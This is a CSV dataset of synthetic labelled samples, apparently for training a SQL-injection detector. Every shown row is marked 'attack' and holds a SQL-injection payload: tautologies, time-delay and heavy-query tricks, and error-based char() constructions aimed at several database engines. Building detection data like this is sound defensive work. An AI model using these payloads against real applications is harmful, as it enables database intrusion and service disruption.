id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,1   )    )    and 9198  =  9198--,nearest_attack_euclidean,R001982,0.45982866105175474
SMOTE_000002,attack,boolean,"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001514,0.027521676134903368
SMOTE_000003,attack,boolean,"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001815,0.0472477561346956
SMOTE_000004,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R002746,0.07075850799884492
SMOTE_000005,attack,boolean,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R001510,0.03145765266963341
SMOTE_000006,attack,boolean,"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000798,0.08970627418293296
SMOTE_000007,attack,boolean,"1""  )   as pydh where 3407  =  3407 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R001155,0.4737743447216123
SMOTE_000008,attack,boolean,-3634%'   )    )    or 2671  =  2434,nearest_attack_euclidean,R002339,0.40646858189788343
SMOTE_000009,attack,boolean,hi' or 'a'  =  'a,nearest_attack_euclidean,R000258,2.0727181095851153
SMOTE_000010,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu",nearest_attack_euclidean,R001621,0.5348626032323652
SMOTE_000011,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'tnvm' like 'tnvm",nearest_attack_euclidean,R001919,0.07443420353005707
SMOTE_000012,attack,boolean,1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,nearest_attack_euclidean,R003510,0.011748667162705262
SMOTE_000013,attack,boolean,-2983'  )   or 8571  =  8571--,nearest_attack_euclidean,R002511,0.0
SMOTE_000014,attack,boolean,"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",nearest_attack_euclidean,R001045,0.05617543405754997
SMOTE_000015,attack,boolean,"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""ldlp""  =  ""ldlp",nearest_attack_euclidean,R001545,0.17837686705261457
SMOTE_000016,attack,boolean,"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",nearest_attack_euclidean,R001630,0.01996920323516452
SMOTE_000017,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002960,0.15531894917013148
SMOTE_000018,attack,boolean,"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb",nearest_attack_euclidean,R000430,0.4197777603151895
SMOTE_000019,attack,boolean,"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002720,0.22464262490254913
SMOTE_000020,attack,boolean,"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj",nearest_attack_euclidean,R001338,0.4671378613323526
SMOTE_000021,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",nearest_attack_euclidean,R001291,0.4500303406731859
SMOTE_000022,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'uqyt'  =  'uqyt",nearest_attack_euclidean,R001635,0.1796405517029105
SMOTE_000023,attack,boolean,1'+  (  select trte where 9173  =  9173 and 2006  =  2006,nearest_attack_euclidean,R000606,0.17274327546346746
SMOTE_000024,attack,boolean,"1%'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003612,0.17298474123479404
SMOTE_000025,attack,boolean,-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,nearest_attack_euclidean,R003104,0.025857505440036118
SMOTE_000026,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0
SMOTE_000027,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R002812,0.8036495691488835
SMOTE_000028,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R002776,1.6204849309082836
SMOTE_000029,attack,boolean,"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'onmp'  =  'onmp",nearest_attack_euclidean,R003348,0.2062874874186802
SMOTE_000030,attack,boolean,"1'+  (  select mumb where 4658  =  4658 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R003302,0.29630427898307016
SMOTE_000031,attack,boolean,"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""bzzt"" like ""bzzt",nearest_attack_euclidean,R000836,0.30688555018310915
SMOTE_000032,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw",nearest_attack_euclidean,R001451,1.2865146718906624
SMOTE_000033,attack,boolean,"1'||  (  select 'aoad' where 8795  =  8795 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R001837,0.0435582332726108
SMOTE_000034,attack,boolean,-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,nearest_attack_euclidean,R003213,0.5701623819551118
SMOTE_000035,attack,boolean,"1""   )    )    as oiqr where 4073  =  4073 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000635,0.0827234339293178
SMOTE_000036,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000913,0.10552761208310232
SMOTE_000037,attack,boolean,"1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",nearest_attack_euclidean,R000849,0.2289355363367696
SMOTE_000038,attack,boolean,"1""  )   as tqxa where 6751  =  6751 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R003420,0.3760647042078047
SMOTE_000039,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- xgyc",nearest_attack_euclidean,R003549,0.3203926752757718
SMOTE_000040,attack,boolean,"1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001288,0.23743865396266417
SMOTE_000041,attack,boolean,1%'   )    )    and 1651  =  9324 and    (    (   '%'  =  ',nearest_attack_euclidean,R002505,0.4143240983085533
SMOTE_000042,attack,boolean,"1'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001822,0.24237700142334379
SMOTE_000043,attack,boolean,"1' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001023,0.17043517130947108
SMOTE_000044,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R001324,0.1227346346031077
SMOTE_000045,attack,boolean,-4428  )   or 3038  =  3038,nearest_attack_euclidean,R001603,0.6458431327009027
SMOTE_000046,attack,boolean,"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""eoab"" like ""eoab",nearest_attack_euclidean,R000869,0.1888917627615492
SMOTE_000047,attack,boolean,"1  )   as zmjm where 9125  =  9125 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002404,0.2696811241024163
SMOTE_000048,attack,boolean,"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002839,0.03517511161414732
